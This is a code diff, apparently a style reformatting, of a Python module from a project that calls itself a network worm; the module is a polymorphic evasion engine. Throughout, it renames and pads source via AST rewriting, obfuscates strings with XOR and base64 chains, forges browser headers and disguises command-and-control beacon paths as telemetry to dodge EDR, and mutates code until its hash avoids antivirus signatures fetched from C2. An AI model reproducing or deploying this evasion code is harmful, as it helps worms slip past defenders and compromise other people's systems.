@@ -1,4 +1,4 @@
-﻿# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 """
 Wormy ML Network Worm v3.0
 Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
@@ -18,23 +18,22 @@ Real techniques:
 """
 
 import ast
+import base64
+import copy
+import hashlib
 import os
-import sys
 import random
 import string
-import hashlib
-import base64
 import struct
+import sys
 import time
-import copy
 from typing import Dict, List, Optional, Set, Tuple
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
-
 # ── Known AV signatures to avoid ─────────────────────────────────────────────
-KNOWN_BAD_HASHES: Set[str] = set()   # populated at runtime from C2
+KNOWN_BAD_HASHES: Set[str] = set()  # populated at runtime from C2
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -51,27 +50,80 @@ class ASTMetamorphTransformer(ast.NodeTransformer):
     def __init__(self):
         self._var_map: Dict[str, str] = {}
         self._reserved = {
-            'self', 'cls', 'None', 'True', 'False', 'print', 'len',
-            'range', 'int', 'str', 'float', 'list', 'dict', 'set',
-            'tuple', 'type', 'open', 'super', 'isinstance', 'hasattr',
-            'getattr', 'setattr', 'enumerate', 'zip', 'map', 'filter',
-            'sorted', 'reversed', 'any', 'all', 'min', 'max', 'sum',
-            'abs', 'round', 'hash', 'id', 'dir', 'vars', 'next',
-            'iter', 'bytes', 'bytearray', 'memoryview', 'input',
+            "self",
+            "cls",
+            "None",
+            "True",
+            "False",
+            "print",
+            "len",
+            "range",
+            "int",
+            "str",
+            "float",
+            "list",
+            "dict",
+            "set",
+            "tuple",
+            "type",
+            "open",
+            "super",
+            "isinstance",
+            "hasattr",
+            "getattr",
+            "setattr",
+            "enumerate",
+            "zip",
+            "map",
+            "filter",
+            "sorted",
+            "reversed",
+            "any",
+            "all",
+            "min",
+            "max",
+            "sum",
+            "abs",
+            "round",
+            "hash",
+            "id",
+            "dir",
+            "vars",
+            "next",
+            "iter",
+            "bytes",
+            "bytearray",
+            "memoryview",
+            "input",
         }
 
     def _random_name(self) -> str:
         """Generate a plausible-looking variable name."""
-        prefixes = ['_data', '_val', '_tmp', '_res', '_buf', '_ctx', '_cfg',
-                    '_info', '_meta', '_state', '_node', '_item', '_obj']
-        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-        return random.choice(prefixes) + '_' + suffix
+        prefixes = [
+            "_data",
+            "_val",
+            "_tmp",
+            "_res",
+            "_buf",
+            "_ctx",
+            "_cfg",
+            "_info",
+            "_meta",
+            "_state",
+            "_node",
+            "_item",
+            "_obj",
+        ]
+        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        return random.choice(prefixes) + "_" + suffix
 
     def visit_Name(self, node: ast.Name) -> ast.Name:
         """Rename local variable references."""
-        if (isinstance(node.ctx, (ast.Store, ast.Load)) and
-                node.id not in self._reserved and
-                not node.id.startswith('__')):
+        if (
+            isinstance(node.ctx, (ast.Store, ast.Load))
+            and node.id not in self._reserved
+            and not node.id.startswith("__")
+        ):
             if node.id not in self._var_map:
                 self._var_map[node.id] = self._random_name()
             node.id = self._var_map[node.id]
@@ -94,13 +146,16 @@ class ASTMetamorphTransformer(ast.NodeTransformer):
         """
         nop_templates = [
             # Benign arithmetic
-            lambda: ast.parse(f"_nop_{random.randint(0,9999)} = {random.randint(1,100)} ^ {random.randint(1,100)}", mode='single').body[0],
+            lambda: ast.parse(
+                f"_nop_{random.randint(0,9999)} = {random.randint(1,100)} ^ {random.randint(1,100)}",
+                mode="single",
+            ).body[0],
             # List comprehension (no assignment = pure computation)
-            lambda: ast.parse(f"[_x for _x in range({random.randint(2,8)})]", mode='eval'),
+            lambda: ast.parse(f"[_x for _x in range({random.randint(2,8)})]", mode="eval"),
             # Hash of random string
-            lambda: ast.parse(f"hash('{self._random_name()}')", mode='eval'),
+            lambda: ast.parse(f"hash('{self._random_name()}')", mode="eval"),
             # Type check
-            lambda: ast.parse(f"isinstance({random.randint(1,100)}, int)", mode='eval'),
+            lambda: ast.parse(f"isinstance({random.randint(1,100)}, int)", mode="eval"),
         ]
 
         new_body = []
@@ -135,35 +190,38 @@ class StringObfuscator:
 
     def obfuscate(self, s: str) -> str:
         """Return a Python expression that evaluates to the original string."""
-        method = random.choice(['xor_b64', 'hex_reverse', 'b64_chain', 'chr_concat'])
+        method = random.choice(["xor_b64", "hex_reverse", "b64_chain", "chr_concat"])
 
-        if method == 'xor_b64':
+        if method == "xor_b64":
             key = random.randint(1, 127)
             xored = bytes([ord(c) ^ key for c in s])
             b64 = base64.b64encode(xored).decode()
             return f"''.join(chr(b^{key}) for b in __import__('base64').b64decode('{b64}'))"
 
-        elif method == 'hex_reverse':
+        elif method == "hex_reverse":
             hexed = s.encode().hex()
             reversed_hex = hexed[::-1]
             return f"bytes.fromhex('{reversed_hex}'[::-1]).decode()"
 
-        elif method == 'b64_chain':
+        elif method == "b64_chain":
             b1 = base64.b64encode(s.encode()).decode()
             b2 = base64.b64encode(b1.encode()).decode()
-            return f"__import__('base64').b64decode(__import__('base64').b64decode('{b2}')).decode()"
+            return (
+                f"__import__('base64').b64decode(__import__('base64').b64decode('{b2}')).decode()"
+            )
 
         else:  # chr_concat
-            chars = '+'.join(f'chr({ord(c)})' for c in s)
+            chars = "+".join(f"chr({ord(c)})" for c in s)
             return chars
 
     def obfuscate_all_strings(self, source: str) -> str:
         """Replace string literals in source code with obfuscated versions."""
         import re
+
         # Only replace strings longer than 4 chars, skip f-strings and docstrings
         def replacer(m):
             s = m.group(1)
-            if len(s) < 4 or '\\' in s or '{' in s:
+            if len(s) < 4 or "\\" in s or "{" in s:
                 return m.group(0)
             try:
                 return self.obfuscate(s)
@@ -194,29 +252,33 @@ class NetworkFingerprintRandomiser:
     ]
 
     ACCEPT_LANGUAGES = [
-        "en-US,en;q=0.9", "en-GB,en;q=0.8,en-US;q=0.6",
-        "es-ES,es;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
+        "en-US,en;q=0.9",
+        "en-GB,en;q=0.8,en-US;q=0.6",
+        "es-ES,es;q=0.9,en;q=0.8",
+        "de-DE,de;q=0.9,en;q=0.8",
         "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
     ]
 
     ACCEPT_ENCODINGS = [
-        "gzip, deflate, br", "gzip, deflate", "br, gzip",
+        "gzip, deflate, br",
+        "gzip, deflate",
+        "br, gzip",
     ]
 
     def random_headers(self) -> Dict[str, str]:
         """Generate a realistic browser HTTP header set."""
         ua = random.choice(self.USER_AGENTS)
         return {
-            'User-Agent': ua,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': random.choice(self.ACCEPT_LANGUAGES),
-            'Accept-Encoding': random.choice(self.ACCEPT_ENCODINGS),
-            'Connection': random.choice(['keep-alive', 'close']),
-            'Cache-Control': random.choice(['no-cache', 'max-age=0', '']),
-            'DNT': random.choice(['1', '0', '']),
-            'Upgrade-Insecure-Requests': '1',
+            "User-Agent": ua,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": random.choice(self.ACCEPT_LANGUAGES),
+            "Accept-Encoding": random.choice(self.ACCEPT_ENCODINGS),
+            "Connection": random.choice(["keep-alive", "close"]),
+            "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
+            "DNT": random.choice(["1", "0", ""]),
+            "Upgrade-Insecure-Requests": "1",
             # Random correlation IDs (look like legitimate traffic)
-            'X-Request-ID': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
+            "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
         }
 
     def random_timing(self, base_ms: int = 2000) -> float:
@@ -225,6 +287,7 @@ class NetworkFingerprintRandomiser:
         Uses log-normal distribution to mimic human timing.
         """
         import math
+
         sigma = 0.4
         multiplier = random.lognormvariate(0, sigma)
         jittered = (base_ms / 1000) * multiplier
@@ -236,17 +299,24 @@ class NetworkFingerprintRandomiser:
         Avoids patterns like /beacon, /c2, /cmd that EDRs flag.
         """
         base_paths = base_paths or [
-            '/api/v2/telemetry', '/analytics/collect', '/cdn-cgi/trace',
-            '/metrics/push', '/health/check', '/status/ping',
-            '/api/sessions/heartbeat', '/gateway/data',
+            "/api/v2/telemetry",
+            "/analytics/collect",
+            "/cdn-cgi/trace",
+            "/metrics/push",
+            "/health/check",
+            "/status/ping",
+            "/api/sessions/heartbeat",
+            "/gateway/data",
         ]
         path = random.choice(base_paths)
         # Add random query params to change the URL signature
-        params = '&'.join([
-            f"t={int(time.time())}",
-            f"r={random.randint(100000, 999999)}",
-            f"v={random.choice(['1.0', '2.1', '3.0'])}",
-        ])
+        params = "&".join(
+            [
+                f"t={int(time.time())}",
+                f"r={random.randint(100000, 999999)}",
+                f"v={random.choice(['1.0', '2.1', '3.0'])}",
+            ]
+        )
         return f"{path}?{params}"
 
 
@@ -295,15 +365,15 @@ class AdvancedPolymorphicEngine:
 
     def __init__(self, mutation_level: int = 3, max_attempts: int = 5):
         self.mutation_level = mutation_level
-        self.max_attempts   = max_attempts
-        self.transformer    = ASTMetamorphTransformer()
-        self.string_obf     = StringObfuscator()
-        self.net_fp         = NetworkFingerprintRandomiser()
-        self.chunk_enc      = ChunkEncryptor()
+        self.max_attempts = max_attempts
+        self.transformer = ASTMetamorphTransformer()
+        self.string_obf = StringObfuscator()
+        self.net_fp = NetworkFingerprintRandomiser()
+        self.chunk_enc = ChunkEncryptor()
         self.stats = {
-            'mutations_generated': 0,
-            'unique_signatures': 0,
-            'hash_collisions_avoided': 0,
+            "mutations_generated": 0,
+            "unique_signatures": 0,
+            "hash_collisions_avoided": 0,
         }
 
     def mutate_source(self, source: str, avoid_hashes: Set[str] = None) -> str:
@@ -312,21 +382,21 @@ class AdvancedPolymorphicEngine:
         Keeps regenerating until the signature doesn't match any known hash.
         """
         avoid = avoid_hashes or KNOWN_BAD_HASHES
-        best  = source
+        best = source
 
         for attempt in range(self.max_attempts):
             mutated = self._apply_all(source)
-            sig     = hashlib.sha256(mutated.encode()).hexdigest()
+            sig = hashlib.sha256(mutated.encode()).hexdigest()
 
             if sig not in avoid:
                 best = mutated
-                self.stats['unique_signatures'] += 1
+                self.stats["unique_signatures"] += 1
                 break
             else:
-                self.stats['hash_collisions_avoided'] += 1
+                self.stats["hash_collisions_avoided"] += 1
                 logger.debug(f"Hash collision avoided (attempt {attempt+1})")
 
-        self.stats['mutations_generated'] += 1
+        self.stats["mutations_generated"] += 1
         return best
 
     def _apply_all(self, source: str) -> str:
